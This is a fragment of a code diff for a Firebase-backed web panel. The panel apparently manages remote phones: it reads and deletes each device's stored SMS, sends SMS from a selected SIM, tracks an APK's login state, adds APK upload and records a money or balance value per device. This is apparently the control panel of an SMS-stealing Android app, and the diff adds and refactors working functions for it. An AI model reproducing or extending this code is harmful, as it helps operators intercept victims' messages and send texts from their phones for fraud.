+  if(loginEl)loginEl.checked=isApkLoggedIn(d.id);
+}
+function toggleDeviceLogin(on){
+  var d=getSelDev();if(!d)return;
+  patchClientField(d,{login:on?'yes':'no'},on?'Logged in':'Logged out');
+}
+function toggleDeviceDetailLike(){
+  var d=getSelDev();if(!d)return;
+  var next=isApkLiked(d.id)?'no':'yes';
+  patchClientField(d,{liked:next},next==='yes'?'Liked':'Disliked').then(function(){renderDeviceDetail();});
+}
+function toggleDeviceDetailChecked(on){
+  var d=getSelDev();if(!d)return;
+  patchClientField(d,{checked:!!on});
+}
+function copyDevicePhone(){
+  var d=getSelDev();if(!d)return;
+  var text=buildDeviceDetailText(d);
+  var m=text.match(/Phone:\s*([^\n]+)/i);
+  var phone=m?m[1].trim():'';
+  if(!phone){toast('No valid number to copy.',false);return;}
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(phone).then(function(){toast('Phone number copied!',true);}).catch(function(){toast('Copy failed',false);});
+  }else toast(phone,true);
+}
+function pasteDeviceSms(){
+  if(!navigator.clipboard||!navigator.clipboard.readText){toast('Clipboard not available',false);return;}
+  navigator.clipboard.readText().then(function(txt){
+    if(!txt){toast('Clipboard empty',false);return;}
+    var useSim=prompt('Paste SMS via Sim 1 or Sim 2? (1/2)','1');
+    var sim=(useSim==='2')?2:1;
+    var toEl=document.getElementById('smsTo');
+    var msgEl=document.getElementById('smsBody');
+    var parts=String(txt).split(/\n/);
+    if(parts.length>=2){
+      if(toEl)toEl.value=parts[0].replace(/\D/g,'').slice(-10);
+      if(msgEl)msgEl.value=parts.slice(1).join('\n').trim();
+    }else if(msgEl){msgEl.value=txt;}
+    toast('Pasted — tap Sim'+sim+' to send',true);
+  }).catch(function(){toast('Paste failed',false);});
+}
+function deleteDeviceSms(msgId){
+  var d=getSelDev();if(!d||!msgId)return;
+  if(!confirm('Are you sure to delete?'))return;
+  var inst=getFbInstance(d.fbId);
+  if(!inst){toast('Firebase not loaded',false);return;}
+  var url=buildRestUrl(inst,'messages/'+d.rawId+'/'+msgId,getFbAuthKey(inst));
+  fetch(url,{method:'DELETE'}).then(function(r){
+    if(r.ok){toast('Delete',true);loadSmsForDevice(true);}else toast('Delete failed',false);
+  }).catch(function(){toast('Delete failed',false);});
 }
 function renderDeviceSmsList(){
   var el=document.getElementById('devListDeviceSms');
@@ -1226,7 +1532,7 @@ function renderDeviceSmsList(){
   });
   if(_smsLoading&&!list.length){el.innerHTML='<div class="empty">Loading SMS…</div>';return;}
   if(!list.length){el.innerHTML='<div class="empty">No SMS yet</div>';return;}
-  el.innerHTML=list.slice(0,120).map(function(m){return buildSmsCardHtml(m);}).join('');
+  el.innerHTML=list.slice(0,120).map(function(m){return buildSmsCardHtml(m,'',{deletable:true});}).join('');
 }
 function closeDeviceDetail(){
   selDev='';
@@ -1259,29 +1565,10 @@ function sendDeviceSms(sim){
 function saveDeviceMoney(){
   var d=getSelDev();
   if(!d){toast('No device selected',false);return;}
-  var inst=getFbInstance(d.fbId);
-  if(!inst){toast('Firebase not loaded',false);return;}
   var val=(document.getElementById('updateMoney')||{}).value;
   val=val!=null?String(val).trim():'';
   if(!val){toast('Enter amount',false);return;}
-  var node=(d.deviceNode||'clients')+'/'+d.rawId;
-  var body={};
-  body.money=val;
-  body.balance=val;
-  var url=buildRestUrl(inst,node,getFbAuthKey(inst));
-  fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})
-    .then(function(r){return r.json().then(function(j){return{ok:r.ok,j:j};});})
-    .then(function(res){
-      if(res.ok){
-        var raw=clientsRawMap[d.id]||{};
-        raw.money=val;raw.balance=val;
-        clientsRawMap[d.id]=raw;
-        renderDeviceDetail();
-        toast('Money updated',true);
-      }else{
-        toast((res.j&&res.j.error)||'Update failed',false);
-      }
-    }).catch(function(){toast('Update failed',false);});
+  patchClientField(d,{money:val},'Money updated').then(function(){renderDeviceDetail();});
 }
 function selectDevice(id){
   selDev=id;
@@ -2372,14 +2659,16 @@ document.addEventListener('visibilitychange',function(){
     bindDevListEvents();
     loadActiveFb();
     loadDeviceToggles();
+    bindApkUpload();
     loadSmsCacheFromStorage();
     ensureActiveFbValid();
+    processClientsDataNow();
     fetchAllData().catch(function(){toast('Sync failed — check Firebase',false);});
     loadAutoTokenState();
   }catch(e){console.error(e);}
 })();
 setInterval(function(){
   if(!panelReady||_panelPaused)return;
-  fetchAllData().catch(function(){});
+  fetchAllData(false).catch(function(){});
 },SYNC_INTERVAL_MS);
 window.addEventListener('unhandledrejection',function(){});
